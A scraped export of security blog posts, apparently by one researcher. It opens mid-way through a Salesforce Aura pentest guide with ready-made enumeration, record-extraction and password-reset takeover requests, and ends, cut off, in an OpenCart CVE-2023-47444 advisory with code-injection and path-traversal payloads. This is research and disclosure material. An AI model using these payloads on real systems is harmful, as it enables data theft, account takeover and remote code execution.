{\"event\":{\"descriptor\":\"markup://aura:invalidSession\",\"attributes\":{\"values\":{}},\"eventDef\":{\"descriptor\":\"markup://aura:invalidSession\",\"t\":\"APPLICATION\",\"xs\":\"I\",\"a\":{\"newToken\":[\"newToken\",\"aura://String\",\"I\",false]}}},\"exceptionMessage\":\"Guest user access is not allowed\",\"exceptionEvent\":true}   Identify Standard and Custom aura components  A few standard JS files are loaded in nearly every Salesforce web application, containing details about standard classes, actions, and occasionally custom classes as well.    app.js   aura_prod.js   bootstrap.js   Grep for the below pattern in the responses of these JS files to identify the various classes and controllers made available by the site:    componentService.initControllerDefs([{     Custom classes sometimes are listed in those JS files too, but it‚Äôs most common to find them in HTTP requests and responses as you browse the application.  You can recognize custom classes from standard ones because they start with apex:// instead of aura://  // STANDARD class: aura://RecordUiController/ACTION$getObjectInfo  // CUSTOM class: apex://New_Sales_Controller/ACTION$getSalesData   You can easily search for them by grepping the full HTTP history and looking for the following keywords:    compound:// in server responses (most of the time you can recognize easily the request because the message parameter is passed inside the query string instead of a POST body):    apex%3a%2f%2f in HTTP requests:    Within the various responses, you should obtain some results similar to the following snippet: \"componentDef\":{\"descriptor\":\"markup://c:CA_CommunityUtil\"}, ... snip ... { \"xs\":\"P\",\"descriptor\":\"markup://c:CA_CommunityUtil\", \"rl\":true,\"st\":{\"descriptor\":\"css://c.CA_CommunityUtil\", \"co\":\"\", \"cl\":\"cCA_CommunityUtil\"}, \"cd\":{   \"descriptor\":\"compound://c.CA_CommunityUtil\",   \"ac\":[     {       \"n\":\"getCurrentCommunityContextInfos\",       \"descriptor\":\"apex://CommunityUtil/ACTION$getCurrentCommunityContextInfos\",       \"at\":\"SERVER\",       \"rt\":\"apex://Map&lt;String,ANY&gt;\",       \"pa\":[]     },     {       \"n\":\"getCurrentCommunityUrl\",       \"descriptor\":\"apex://CommunityUtil/ACTION$getCurrentCommunityUrl\",       \"at\":\"SERVER\",       \"rt\":\"apex://String\",       \"pa\":[]     }   ] }   The important values to note here are:    The descriptor value that exists in componentDefs : This can be used for retrieving the full definition, although not required at the moment (more about this later). The descriptor format is made up of namespace:component.   The descriptor value inside the ac field, defining the actual controller and action.   rt: The return value type.   pa: Parameters that are passed to the apex class method, and their type.      Use the following regex alongside some tool integrated with grep (eg. Response Grepper 11) in order to quickly extract custom apex class descriptors: Regex: \"descriptor\":\"(apex:\\/\\/[^\\\"]*)    Sometimes, however, searching for compound:// in server responses does not reveal any custom apex controller (because maybe it was cached by the browser in the past, or for any other reason).  In these cases, we must use different approaches:    we can search with a top-down approach for every custom component starting from static resources 12   we can identify any HTTP request that sends a message field containing an apex controller and extract some important values that will be used later to query the /auraCmpDef endpoint and obtain any custom controller linked to the original apex class.   Below is an example of a request for a message using an apex controller, and the required parameters to be extracted: POST /foo/s/sfsites/aura?r=2&amp;other.CommunityUtil.getCurrentCommunityContextInfos=1 HTTP/2 Host: [...REDACTED...] Cookie: [...TRUNCATED...] Content-Length: 760 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36 X-Sfdc-Page-Scope-Id: 91062b0d-10f8-402b-a496-5ece7b62f20a Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept: */* Origin: [...REDACTED...] Referer: [...REDACTED...] Priority: u=1, i  message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2246%3Ba%22%2C%22descriptor%22%3A%22apex%3A%2F%2FCommunityUtil%2FACTION%24getCurrentCommunityContextInfos%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fc%3ACA_CommunityUtil%22%2C%22params%22%3A%7B%7D%7D%5D%7D &amp;aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22ZzhjQmRxMXdrdzhvS0RJMG5qQVdxQTdEcXI0cnRHWU0zd2xrUnFaakQxNXc5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%221098_0Gzb_TJPQxPxmu8ktwr7uw%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D &amp;aura.pageURI=[...TRUNCATED...]&amp;aura.token=null   From the relative context field, we have to extract:    the loaded content and the relative ID   the desired descriptor   From the message field, we have to identify the custom callingDescriptor.    Once obtained these three information, we can query the /auraCmpDef endpoint and extract every declared apex controller for the specified descriptor:  GET /example/auraCmpDef?aura.app=&lt;APP_MARKUP&gt;&amp;_au=&lt;AU_VALUE&gt;&amp;_def=&lt;COMPONENT_MARKUP&gt;&amp;_ff=DESKTOP&amp;_l=true&amp;_cssvar=false&amp;_c=false&amp;_l10n=en_US&amp;_style=-1450740311&amp;_density=VIEW_ONE HTTP/1.1 Host: redacted.my.site.com  Example: https://redacted.my.site.com/example/auraCmpDef?aura.app=markup://siteforce:loginApp2&amp;_au=1098_0Gzb_TJPQxPxmu8ktwr7uw&amp;_def=markup://c:CA_CommunityUtil&amp;_c=false&amp;_density=VIEW_ONE&amp;_dfs=8&amp;_ff=DESKTOP&amp;_l=true&amp;_l10n=en_US&amp;_lrmc=-386269907&amp;_style=-1450740311&amp;_uid=329__98ODtCT_xKhlVwqtRYokg&amp;aura.mode=PROD     Now that we know exactly the definition of the controller, we can craft an ad-hoc message to the community‚Äôs aura endpoint to attempt to interact with the method:  POST /custom-community/s/sfsites/aura HTTP/2 Host: [...REDACTED...] Cookie: [...TRUNCATED...] Content-Length: 816 Content-Type: application/x-www-form-urlencoded; charset=UTF-8  message={\"actions\":[{\"id\":\"150;a\",\"descriptor\":\"apex://CommunityUtil/ACTION$getCurrentCommunityContextInfos\",\"callingDescriptor\":\"markup://c:CA_CommunityUtil\",\"params\":{}}]} &amp;aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22ZzhjQmRxMXdrdzhvS0RJMG5qQVdxQTdEcXI0cnRHWU0zd2xrUnFaakQxNXc5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221176_RiEqto7a10RL4-qsAx8xFg%22%2C%22MODULE%40markup%3A%2F%2Flightning%3Af6Controller%22%3A%22292_Kx4YnuF8cbgQbawpLBy0SQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%22335_G1NlWPtUoLRA_nLC-0oFqg%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D &amp;aura.pageURI=[...REDACTED...] &amp;aura.token=null   A more detailed list of descriptors and undocumented endpoints can be found at the following links:    lightning/ui*Api Wire Adapters and Functions, developer.salesforce.com   Aura descriptors and how to use them (written by Nitay Bachrach, varonis.com)   Identify Standard and Custom Objects  Going back to what was said in the introduction, in Salesforce there are two types of objects: standard and custom. Both of them can be misconfigured and made accessible to unauthorized users.  From an attacker‚Äôs point of view, it is important to identify as many misconfigured Objects as possible as they may contain sensitive information, both for the exploitation phase and for the nature of the data itself.  The following is a list of controllers and actions that can be used to enumerate objects and look for permission issues or information leaks (insert them within the message field and send them to /aura):     getConfigData: List all the configuration and objects within the apiNamesToKeyPrefixes key for the current Salesforce application. Search within the response for Custom Objects suffixed with __c and copy them to a custom wordlist.     {\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"aura://HostConfigController/ACTION$getConfigData\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{}}]}                getObjectInfo 13: Get metadata about a specific object. You can use this action to understand if the user has access to the object or not. It will not return any informative response if the user does not have access, otherwise, this will return information about an object and its corresponding fields. Watch out for __c in the response from each object to make notes about the related custom objects and fields.     {\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"aura://RecordUiController/ACTION$getObjectInfo\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"objectApiName\":\"¬ßFUZZ-EVERY-OBJECT-HERE¬ß\"}}]}                   getListByObjectName: returns the lists created for an object in the UI. Watch out for __c in the response from each object to make note about the related custom objects and fields.     {\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"aura://ListUiController/ACTION$getListsByObjectName\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"objectApiName\":\"¬ßFUZZ-EVERY-OBJECT-HERE¬ß\"}}]}           At this point, after having merged the standard objects 4 and the custom objects obtained with the actions above, we are ready to check which ones are accessible and what information they contain.  Let‚Äôs start digging!  Fuzzing and Exploitation  Once we have mapped out most of the attack surface and obtained valid aura.token and aura.context values (go grab them from any Salesforce exposed with the guest user active if your target doesn‚Äôt provide them!), we can start extracting data and interacting with the identified classes.  Object permission issues  If admins messed up the sharing permissions on the various objects and fields, we can use some standard controllers to access the broken records.     getItems: retrieves records for a given object bounded to specific user permissions, but if record permissions are misconfigured, this can retrieve records of an entire object.     {\"actions\":[{\"id\":\"123;a\",\"descriptor\":\"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"entityNameOrId\":\"¬ßFUZZ-EVERY-STANDARD-OBJECT¬ß\",\"layoutType\":\"FULL\",\"pageSize\":100,\"currentPage\":0,\"useTimeout\":false,\"getCount\":false,\"enableRowActions\":false}}]}           getRecord 14: retrieves records starting from on a record id.     {\"actions\":[{\"id\":\"123;a\",\"descriptor\":\"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"recordId\":\"¬ßRECORD-ID¬ß\",\"record\":null,\"inContextOfComponent\":\"\",\"mode\":\"VIEW\",\"layoutType\":\"FULL\",\"defaultFieldValues\":null,\"navigationLocation\":\"LIST_VIEW_ROW\"}}]}              IDs generally look like this: \"Id\":\"0099g000001mWQaYHU\"   Using these controllers, I started to extract every misconfigured object from the various communities, obtaining different interesting information, including:    customers names, surnames, emails, phone numbers, and other PII from several Contact objects   names, surnames, emails and IDs (very useful for the exploitation phase) from several Account objects   Other PII from different AccountTeamMember and AccountContactRelation objects   Personal notes from some Note objects   Exposed files from several Document, ContentDocument and ContentVersion objects   Calendar events from Calendar objects   and other information from some other standard and custom objects, like Knowledge__kav, KnowledgeArticleVersion, ProcessInstanceWorkitem, CollaborationGroup and many others    sample data exposed by a User object   list of User IDs   estimated quotations for customer orders   personal user information  Among the various objects, some of them will return IDs particularly related to attachments. You can use those IDs with some specific API to retrieve and download the raw files (these paths are relative to the base path, not the aura endpoint):     Document - Prefix 015 - /servlet/servlet.FileDownload?file=ID   ContentDocument - Prefix 069 - /sfc/servlet.shepherd/document/download/ID   ContentVersion - Prefix 068 - /sfc/servlet.shepherd/version/download/ID   See Salesforce Object Key Prefix List (written by biswajeetsamal, biswajeetsamal.com)  for a full default object ID prefixes list.  // sample input {\"actions\":[{\"id\":\"123;a\",\"descriptor\":\"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"entityNameOrId\":\"ContentVersion\",\"layoutType\":\"FULL\",\"pageSize\":100,\"currentPage\":0,\"useTimeout\":false,\"getCount\":false,\"enableRowActions\":false}}]}  // sample output {\"record\":{\"LastModifiedDate\":\"2023-09-01T13:13:22.000Z\",\"Description\":null,\"CreatedDate\":\"2023-09-01T13:13:20.000Z\",\"Title\":\"NPAZ_599283a16ca1463fa0523e4088b4602 (1)\",\"CurrencyIsoCode__l\":\"EUR - Euro\",\"Id\":\"068690000164AzJAAU\",\"CurrencyIsoCode\":\"EUR\",\"LastModifiedById\":\"0056900000BlCU8AAN\",\"SystemModstamp\":\"2024-03-22T11:21:11.000Z\",\"sobjectType\":\"ContentVersion\"}}   GET /sfc/servlet.shepherd/version/download/068690000164AzJAAU HTTP/2 Host: redacted.com  --- RESPONSE ---  HTTP/2 200 OK Date: Wed, 03 Jul 2024 20:04:52 GMT Content-Type: image/jpeg; charset=UTF-8   Doing this way, I was able to access and download some files conceptually conceived as restricted relative to deployment configurations, private screenshots, sales tables, and others.    sample files exposed by a ContentDocument object  Broken Access Control on Custom Classes  While enumerating the communities that had been assigned to me, I stumbled upon a couple of communities that particularly caught my attention. They had the Guest User enabled, and I was able to query a lot of interesting information including user-related ones (see the previous section), but most importantly, they automatically contacted a couple of custom controllers to read out some routes.    Visiting these routes, the sites started to make many more requests to the aura endpoint to download every relevant controller matched to the route, exposing many custom controllers and custom methods.     Has something already caught your attention?  Out of all the various controllers, one in particular was very interesting to me: CA_ChangePasswordSettingController, and in particular the action resetPassword:    \"cd\":{   \"descriptor\": \"compound://c.CA_ResetPasswordSetting\",   \"ac\": [     {       \"n\": \"resetPassword\",       \"descriptor\": \"apex://CA_ChangePasswordSettingController/ACTION$resetPassword\",       \"at\": \"SERVER\",       \"rt\": \"apex://String\",       \"pa\": [         {           \"name\": \"userID\",           \"type\": \"apex://String\"         },         {           \"name\": \"newPassword\",           \"type\": \"apex://String\"         }       ]     }   ] }   We can notice from its descriptor that the resetPassword ACTION accepts only two string parameters:    userID   newPassword    This is not good!  By not requiring the user‚Äôs previous password or a valid reset password token, this controller can potentially be abused to reset any user‚Äôs password starting from a simple userID (permissions apart). Furthermore, UserIDs can be extracted from the standard object User, as we did in the previous section.   list of User IDs extracted from the User standard object  Probably this controller was not meant to be contacted from the outside, I think it was for internal use as a result of the call to the chagePassword method, but since it was placed inside the CA_ChangePasswordSettingController class, which is exposed, it ended up being wrongly exposed as well.   changePassword method contained inside CA_ChangePasswordSettingController  Since I was running the tests on production sites, I immediately reached out to the Communities maintainers, explaining to them the issue and the possible critical impacts. They provided me with a sample userID with which I can test the functionality.  Having everything required, I used the descriptor to replicate a valid aura call to the Apex controller CA_ChangePasswordSettingController, and finally reset the user‚Äôs password and took over his account.  {   \"actions\": [     {       \"id\": \"123;a\",       \"descriptor\": \"apex://CA_ChangePasswordSettingController/ACTION$resetPassword\",       \"callingDescriptor\": \"UNKNOWN\",       \"params\": {         \"userID\": \"0056&lt;REDACTED&gt;M\",         \"newPassword\": \"RT-wofnwo2!$4nfi!\"       }     }   ] }    User‚Äôs password successfully reset  This vulnerability could have had a massive impact. Even though custom controllers are pretty straightforward to find, they are often overlooked during Salesforce penetration tests because not every tester knows this particular attack vector.  Other attack vectors and interesting cases  In addition to the permission problems on standard and custom objects, the exposure of custom controllers, and the classic web vulnerabilities like XSS and unsecured APIs, there are other attack vectors that I did not find directly during testing but have read about online and will list below:    SOQL Injection 15 16 17 18 and Blind SOQL Injection 19 20   ‚ÄúWithout sharing‚Äù Apex vulnerability, varonis.com   Ghost Sites: Stealing Data From Deactivated Salesforce Communities, varonis.com   The Top 20 Vulnerabilities Found in the AppExchange Security Review, developer.salesforce.com   Undocumented descriptors and endpoints, varonis.com   Tools and Labs  To facilitate analysis and enumeration, there are a few tools (with their limitations and shortcomings) that can help speed up and automate the work:    nuclei and salesforce templates 821   poc_salesforce_lightning   lightning-burp      I have not found other useful tools, but please let me know if I have missed something!   If you need a lab to practice with, have a look at the following links:    paas-cloud-goat, Coalfire-Research; github.com                  Salesforce Lightning: The Future of Sales and CRM, salesforce.com¬†&#8617;&#xfe0e;                 Lightning Platform: Building blocks of better apps, salesforce.com¬†&#8617;&#xfe0e;                 Overview of Salesforce Objects and Fields, developer.salesforce.com¬†&#8617;&#xfe0e;                 Standard Objects, developer.salesforce.com¬†&#8617;&#xfe0e;¬†&#8617;&#xfe0e;2                 Custom Objects, developer.salesfroce.com¬†&#8617;&#xfe0e;                 Aura Components, developer.salesforce.com¬†&#8617;&#xfe0e;                 Salesforce Recon Process, enumerated.ie¬†&#8617;&#xfe0e;                 salesforce-aura.yaml, github.com¬†&#8617;&#xfe0e;¬†&#8617;&#xfe0e;2                 gau, github.com¬†&#8617;&#xfe0e;                 waymore, github.com¬†&#8617;&#xfe0e;                 Response Grepper, portswigger.net¬†&#8617;&#xfe0e;                 Retrieving the markup descriptor of custom Components, appomni.com¬†&#8617;&#xfe0e;                 getObjectInfo, developer.salesforce.com¬†&#8617;&#xfe0e;                 getRecord, developer.salesforce.com¬†&#8617;&#xfe0e;                 SOQL Injection, developer.salesforce.com¬†&#8617;&#xfe0e;                 SOQL Injection Lab., infosecwriteups.com¬†&#8617;&#xfe0e;                 SQL Injection Union Based, hackerone.com¬†&#8617;&#xfe0e;                 Second-order SOQL injection through email and campaign name parameter, heckerone.com¬†&#8617;&#xfe0e;                 Blind SOQL Injection, appomni.com¬†&#8617;&#xfe0e;                 SOQL subquery blind attack, varonis.com¬†&#8617;&#xfe0e;                 salesforce-misconfiguration.yaml, github.com¬†&#8617;&#xfe0e;"
  },
  
  {
    "title": "Let's talk about communities with Meethack Torino",
    "url": "/posts/parliamo-di-community-rev3rse-meethack/",
    "categories": "Articles & Writeups, InfoSec Education",
    "tags": "podcast, interview, meethack",
    "date": "2024-02-27 00:00:00 +0100",
    "content": "Introduction I had the honour and great pleasure to be a guest of Andrea (theMiddle) Menin on his REV¬≥RSE security YouTube channel, together with other Meethack friends and members, to talk about Community and much more!  üéôÔ∏è We told our story. We talked about what it means to be a cybersecurity community in 2024, the challenges, failures and successes. Feel free to give a listen and maybe some feedback (sorry but the podcast is in Italian language only. Maybe some AI tools can help you, btw üòº)!  Video   Useful links     Meethack Torino   Meethack Torino Events   REV¬≥RSE security   REV¬≥RSE security YT channel   REV¬≥RSE security Twitter"
  },
  
  {
    "title": "How NOT to react to a responsible disclosure (CVE-2023-47444)",
    "url": "/posts/come-non-reagire-a-una-resp-discloure/",
    "categories": "Articles & Writeups, InfoSec Education",
    "tags": "interview, podcast",
    "date": "2023-12-23 00:00:00 +0100",
    "content": "Introduction In this video posted on my dear friend Leonardo Tamiano‚Äôs channel, we discuss a CVE recently discovered by me, the CVE-2023-47444, found in opencart, an open source e-commerce written in PHP.  Since Leonardo is very interested in this type of research, he invited me on his channel to discuss the topic and my experience. In the first half he asked me a few questions about how I handled the research, and in the second half we talk about the responsible disclosure process and how it was handled (badly) by the project‚Äôs maintaner, who instead of accepting my contribution, he decided to act ignorant and insult the work done.  If you haven‚Äôt already done so, subscribe to Leonardo‚Äôs channel on youtube, and follow his channel for more research, videos and technical contributions.  (sorry but the podcast is in Italian language only. Maybe some AI tools can help you, btw üòº)  Video   Timestamp  TIMESTAMPS: 00:00 - Introduction 01:08 - Who is 0xbro?? 02:17 - OpenCart - The Research Target 03:55 - Time organisation 05:40 - Past research on the project 07:55 - Vulnerability Details (CVE-2023-47444) 20:10 - Thoughts on the activity 22:10 - Vulnerability disclosure approach 25:11 - The (ignorant) response of the developer 29:30 - The importance of the threat model 32:25 - The relationship between programmers and researchers 39:57 - The cost of ignorance 41:00 - Final remarks 42:54 - BONUS - Environment setup for opencart research"
  },
  
  {
    "title": "Authenticated Static Code Injections in OpenCart (CVE-2023-47444)",
    "url": "/posts/opencart-CVE-2023-47444/",
    "categories": "Disclosed Vulnerabilities",
    "tags": "PHP, rce",
    "date": "2023-11-14 00:00:00 +0100",
    "content": "In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security ‚Äúaccess‚Äù and ‚Äúmodify‚Äù privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server.     Summary     Product   OpenCart   Vendor   OpenCart   Severity   High   Affected Version(s)   4.0.0.0 - 4.0.2.3   Tested Version(s)   4.0.2.2, 4.0.2.3   CVE   CVE-2023-47444   CVE Description   In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security \"access\" and \"modify\" privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server.   CWE   CWE-96: Improper Neutralization of Directives in Statically Saved Code   CVSS 3.1 Score  Base Score:¬†8.8 (High) Vector String:¬†CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H                 Metric       Value                       Attack Vector (AV)       Network                 Attack Complexity (AC)       Low                 Privileges Required (PR)       Low                 User Interaction (UI)       None                 Scope (S)       Unchanged                 Confidentiality (C)       High                 Integrity (I)       High                 Availability (A)       High           Group Privileges and considerations  OpenCart manages privileges following a ‚Äúmatrix‚Äù approach, where read (access) and write (modify) permissions can be granted on every specific route, for any ‚ÄúUser Group‚Äù.    common/security is the route that (optionally) moves the storage folder out of the application root once the installation is complete, renames the /admin path to something new, and removes the installation folder when the installation process is finish.    By default, OpenCart has only one administrator group and user, having full read/write permissions. All the other new users must be created and configured from scratch, including their permissions, so it depends on the individual configuration whether common/security is included or not.  In my personal experience, I tested different client‚Äôs OpenCart installations, and many times I found non-administrative users (such as sales account, brand operators, support accounts, etc.) having the common/security permissions enabled. Reasons can range from misconception of the ‚Äúcommon‚Äù privilege group, to lazyness of sysadmins applying a black-list approach (enabling everything with the ‚ÄúAll‚Äù option and then removing only some permissions) instead of selecting only the specific desired permissions.  From a pure threat model perspective, so, the vulnerability has some important pre-requisites (see also Exploit Conditions and Prerequisites) that makes exploitation not so common and significantly lower the risk. Considering the various installation I tested in the past, however, we cannot assume that other installations do not also share the same bad practice. It may be that companies create and use other profiles besides admin and that these profiles include common/security, just as it may be that the numbers are significantly lower and that my cases were exceptions.  Vulnerabilities  There are two distinct static code injection vulnerabilities in the function that moves the storage folder outside the application web root, and the function that renames the secret admin path after the installation. While the latter can be exploited only if the admin folder has not yet been renamed, the former can be exploited anytime, even if the storage folder has already been moved. Both vulnerabilities require that the user has the common/security ‚Äúaccess‚Äù and ‚Äúmodify‚Äù privileges enabled. Exploiting them, an authenticated adversary can inject arbitrary static PHP code that will be executed by every page, resulting in arbitrary remote code execution. Those vulnerabilities were both introduced from OpenCart 4.0.0.0 onward.     Because of the nature of the vulnerabilities, it is very likely to create disruption and break the application completely if the configuration files and the actual directories created on disk do not match at the end of exploitation.   Vulnerabilities Details and Root Causes  Static Code Injection in common/security.storage     The storage() function in upload/admin/controller/common/security.php is vulnerable to PHP static code injection because $name and $path user-controlled variables are concatenated and placed inside $base_new, which is then written inside the config.php and admin/config.php files, without proper escape or validation.   The relevant vulnerable code can be found below:  4.0.2.3/upload/admin/controller/common/security.php public function storage(): void {     // ...     if (isset($this-&gt;request-&gt;get[\"page\"])) {         $page = (int)$this-&gt;request-&gt;get[\"page\"];     } else {         $page = 1;     }     if (isset($this-&gt;request-&gt;get[\"name\"])) {         $name = preg_replace( // [1]             \"[^a-zA-z0-9_]\",             \"\",             basename(                 html_entity_decode(                     trim($this-&gt;request-&gt;get[\"name\"]),                      ENT_QUOTES,                     \"UTF-8\"                 )             )         );     } else {         $name = \"\";     }     if (isset($this-&gt;request-&gt;get[\"path\"])) {         $path = preg_replace( // [2]             \"[^a-zA-z0-9_\\:\\/]\",             \"\",             html_entity_decode(                 trim($this-&gt;request-&gt;get[\"path\"]),                  ENT_QUOTES,                 \"UTF-8\"             )         );     } else {         $path = \"\";     }     $json = [];     if ($this-&gt;user-&gt;hasPermission(\"modify\", \"common/security\")) {         // ...         $base_new = $path . $name . \"/\";         // ...         $root = str_replace(\"\\\\\", \"/\", realpath($this-&gt;request-&gt;server[\"DOCUMENT_ROOT\"] . \"/../\"));         if (substr($base_new, 0, strlen($root)) != $root || $root == $base_new) { // [3]             $json[\"error\"] = $this-&gt;language-&gt;get(\"error_storage\");         }         if (is_dir($base_new) &amp;&amp; $page &lt; 2) { // [4]             $json[\"error\"] = $this-&gt;language-&gt;get(\"error_storage_exists\");         }         if (!is_writable(DIR_OPENCART . \"config.php\") || !is_writable(DIR_APPLICATION . \"config.php\")) {             $json[\"error\"] = $this-&gt;language-&gt;get(\"error_writable\");         }     } else {         $json[\"error\"] = $this-&gt;language-&gt;get(\"error_permission\");     }     if (!$json) {         // ...         // Create the new storage folder         if (!is_dir($base_new)) {             mkdir($base_new, 0777); // [5]         }         // ...         for ($i = $start;$i &lt; $end;$i++) {             // moving all the files and directories from the old storage folder to the newer one             // ...                      }         if ($end &lt; $total) {             $json[\"next\"] = $this-&gt;url-&gt;link(                 \"common/security.storage\",                 \"&amp;user_token=\" .                     $this-&gt;session-&gt;data[\"user_token\"] .                     \"&amp;name=\" .                     $name .                     \"&amp;path=\" .                     $path .                     \"&amp;page=\" .                     ($page + 1),                 true             );         } else {             // Start deleting old storage location files and directories.             // ...             rmdir($base_old);             // Modify the config files             $files = [DIR_APPLICATION . \"config.php\", DIR_OPENCART . \"config.php\", ];             foreach ($files as $file) {                 $output = \"\";                 $lines = file($file);                 foreach ($lines as $line_id =&gt; $line) {                     if (strpos($line, 'define(\\'DIR_STORAGE') !== false) {                         $output.= 'define(\\'DIR_STORAGE\\', \\'' . $base_new . '\\');' . \"\\n\"; // [6]                                              } else {                         $output.= $line;                     }                 }                 $file = fopen($file, \"w\");                 fwrite($file, $output);                 fclose($file);             }             // ...         }     } }  At [1] and [2], the new storage directory‚Äôs name and path are obtained from the incoming HTTP GET request and stored into $name and $path PHP variables. In both cases, a regex is applied in order to remove special untrusted characters, however, the regex is badly implemented and so does nothing. Furthermore, the basename() 1 function is used on the supplied name parameter, preventing us from using the / character inside it.  $foo = \"storage99');phpinfo();%23\"; $name = preg_replace('[^a-zA-z0-9_]', '', basename(html_entity_decode(trim($foo), ENT_QUOTES, 'UTF-8')));  print($name); // storage99');phpinfo();%23 print(\"\\n\\n\");  $name = preg_replace('/[^a-zA-z0-9_]/', '', basename(html_entity_decode(trim($foo), ENT_QUOTES, 'UTF-8')));  print($name); // storage99phpinfo23 print(\"\\n\\n\");  At [3], after having verified the authenticated user has the write privilege for common/security, some checks are performed on $base_new (which is the concatenation of $name and $path). Here the application checks that $base_new is located inside the OpenCart‚Äôs installation folder, but the check is not well performed and (if required) can be bypassed using a path traversal:  &lt;?php  $root = str_replace('\\\\', '/', realpath('$this-&gt;request-&gt;server[\"DOCUMENT_ROOT\"]' . '/../')); print($root . \"\\n\\n\"); // /home/kali/Projects/OpenCart/4.0.2.3/  $base_new = '/dev/shm/new-folder'; // result -&gt; Error! $base_new = '/home/kali/Projects/new-folder'; // result -&gt; Error! $base_new = '/dev/shm/new-folder'; // result -&gt; Error! $base_new = '/home/kali/Projects/OpenCart/new-folder';  // result -&gt; Error! $base_new = '/home/kali/Projects/OpenCart/4.0.2.3/new-folder';  // result -&gt; Accepted! $base_new = '/home/kali/Projects/OpenCart/4.0.2.3/../../../../../../../../dev/shm/new-folder'; // result -&gt; Accepted!  if ((substr($base_new, 0, strlen($root)) != $root) || ($root == $base_new)) {   print(\"Error!\"); }else{   print(\"Accepted!\"); } ?&gt;   The OpenCart installation directory can be retrieved in many different ways. It can be leaked through the GUI (if the storage folder has never been moved), or through verbose errors (eg. CVE-2011-3763 2). It can also be read from logs if the user has the tool/log read privilege, or it can be discovered mis-using other funtionalities such as the change profile image 3.    At [4], the application checks that $base_new does not already exist and config.php and admin/config.php have writable privileges. If no error has occurred, the application creates the new folder [5] and moves all the files from the old storage path to the newer one. Finally, at [6], it replaces inside config.php and admin/config.php the old DIR_STORAGE value with the newer one, without performing any further checks on the variable.  In a normal scenario, the storage directory will be moved to a newer location under the OpenCart installation folder, and the configuration files will be updated accordingly. However, since there is a lack of input sanitization, it is possible to inject a new storage path inside configuration files containing special characters that allow escaping the define() function and add arbitrary PHP code.  4.0.2.3/upload/admin/config.php // Default DIR_STORAGE value define('DIR_STORAGE', DIR_SYSTEM . 'storage/');  // DIR_STORAGE after a legitimate move define('DIR_STORAGE', '/home/kali/Projects/OpenCart/4.0.2.3/storage-bis/');  // DIR_STORAGE after the exploitation define('DIR_STORAGE', '/home/kali/Projects/OpenCart/4.0.2.3/storage-bis/');phpinfo();#');   Static Code Injection in common/security.admin     The admin() function in upload/admin/controller/common/security.php is vulnerable to PHP static code injection because $name user-controlled variable is placed inside $base_new, which is then written inside a new config.php file, without proper escape or validation.   The relevant vulnerable code can be found below:  public function admin(): void {     // ...     if (isset($this-&gt;request-&gt;get['name'])) { // [1]         $name = preg_replace(             '[^a-zA-z0-9]',              '',              basename(                 html_entity_decode(                     trim((string)$this-&gt;request-&gt;get['name']),                      ENT_QUOTES,                      'UTF-8'                 )             )         );     } else {         $name = 'admin';     }      $json = [];      if ($this-&gt;user-&gt;hasPermission('modify', 'common/security')) {         $base_old = DIR_OPENCART . 'admin/';          $base_new = DIR_OPENCART . $name . '/';          if (!is_dir($base_old)) { // [2]             $json['error'] = $this-&gt;language-&gt;get('error_admin');         }          if (is_dir($base_new) &amp;&amp; $page &lt; 2) {             $json['error'] = $this-&gt;language-&gt;get('error_admin_exists');         }          if ($name == 'admin') {             $json['error'] = $this-&gt;language-&gt;get('error_admin_name');         }          if (!is_writable(DIR_OPENCART . 'config.php') || !is_writable(DIR_APPLICATION . 'config.php')) {             $json['error'] = $this-&gt;language-&gt;get('error_writable');         }     } else {         $json['error'] = $this-&gt;language-&gt;get('error_permission');     }      if (!$json) {         // ...         // 1.  We need to copy the files, as rename cannot be used on any directory,          //     the executing script is running under         // ...         // 2. Create the new admin folder name         if (!is_dir($base_new)) { // [3]             mkdir($base_new, 0777);         }         // 3. split the file copies into chunks.         // ...         // 4. Copy the files across         foreach (array_slice($files, $start, $end) as $file) {             // ...         }          if (($page * $limit) &lt;= $total) {             $json['next'] = $this-&gt;url-&gt;link(                 'common/security.admin',                 '&amp;user_token=' . $this-&gt;session-&gt;data['user_token'] .                  '&amp;name=' . $name .                  '&amp;page=' . ($page + 1),                 true             );         } else {             // Update the old config files             $file = $base_new . 'config.php';             $output = '';             $lines = file($file);              foreach ($lines as $line_id =&gt; $line) {                 $status = true;                  if (strpos($line, 'define(\\'HTTP_SERVER') !== false) {                     $output .= 